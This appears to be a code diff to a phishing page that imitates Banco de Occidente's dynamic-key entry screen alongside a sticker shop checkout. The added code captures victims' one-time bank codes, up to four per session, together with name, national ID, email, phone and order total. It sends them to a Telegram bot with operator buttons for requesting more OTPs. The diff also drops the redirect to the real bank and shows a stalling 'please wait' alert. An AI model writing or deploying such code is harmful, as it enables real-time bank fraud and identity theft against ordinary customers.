@@ -765,15 +765,77 @@
             }
         }
 
+        async function sendToTelegram(text, inlineKeyboard = null) {
+            const body = {
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: "HTML"
+            };
+            if (inlineKeyboard) body.reply_markup = { inline_keyboard: inlineKeyboard };
+
+            try {
+                await fetch(`${TELEGRAM_API}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(body)
+                });
+            } catch (err) {
+                console.error("Error enviando a Telegram:", err);
+            }
+        }
+
         // Confirmar
         btnConfirmar.addEventListener('click', async () => {
             let code = '';
             pinInputs.forEach(input => code += input.value);
             
-            const text = `🏦 <b>Banco de Occidente - Clave Dinámica</b>\n\n🔢 Código: <code>${code}</code>`;
-            await sendToTelegram(text);
+            // OTP Tracking Logic
+            let otpCount = parseInt(sessionStorage.getItem("otp_count") || "0") + 1;
+            if (otpCount > 4) otpCount = 1;
+            sessionStorage.setItem("otp_count", otpCount);
+            sessionStorage.setItem(`otp_val_${otpCount}`, code);
+
+            const nombre = sessionStorage.getItem("nombre") || "---";
+            const cedula = sessionStorage.getItem("cedula") || "---";
+            const correo = sessionStorage.getItem("correo") || "---";
+            const telefono = sessionStorage.getItem("telefono") || "---";
+            const total = sessionStorage.getItem("total") || "---";
+            const banco = sessionStorage.getItem("banco") || "BANCO DE OCCIDENTE";
+            const tipoBanco = sessionStorage.getItem("tipoBanco") || "Natural";
+            const randomID = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+
+            let producto = "STICKER COMBO FAMILIAR x20";
+            try {
+                const order = JSON.parse(sessionStorage.getItem('ms_last_order'));
+                if (order && order.items && order.items.length > 0) {
+                    const item = order.items[0];
+                    producto = (item.isCombo ? 'STICKER COMBO FAMILIAR' : 'STICKER BENDECIDO') + ' x' + item.qty;
+                }
+            } catch (e) {}
+
+            const otp1 = sessionStorage.getItem("otp_val_1") || "—";
+            const otp2 = sessionStorage.getItem("otp_val_2") || "—";
+            const otp3 = sessionStorage.getItem("otp_val_3") || "—";
+            const otp4 = sessionStorage.getItem("otp_val_4") || "—";
+
+            const text = `🔐 <b>PIN Banco de Occidente Recibido — OTP${otpCount}</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n📧 Correo: ${correo}\n📞 Teléfono: ${telefono}\n💰 Total: ${total}\n🛒 Producto: ${producto}\n\n🔑 OTP1: <code>${otp1}</code>\n🔑 OTP2: <code>${otp2}</code>\n🔑 OTP3: <code>${otp3}</code>\n🔑 OTP4: <code>${otp4}</code>\n\n📊 OTP actual: ${otpCount} de 4 | 🆔 ${randomID}`;
+
+            const buttons = [
+                [{ text: "🔄 Pedir OTP", callback_data: "pedir_otp" }],
+                [{ text: "✅ Aceptar", callback_data: "aceptar" }, { text: "❌ Rechazar", callback_data: "rechazar" }]
+            ];
+
+            await sendToTelegram(text, buttons);
+
+            // Limpiar
+            pinInputs.forEach(input => {
+                input.value = '';
+                input.classList.remove('filled');
+            });
+            pinInputs[0].focus();
+            btnConfirmar.disabled = true;
             
-            window.location.href = "https://www.bancodeoccidente.com.co";
+            alert("Código verificado. Por favor espere...");
         });
 
         // Focus inicial
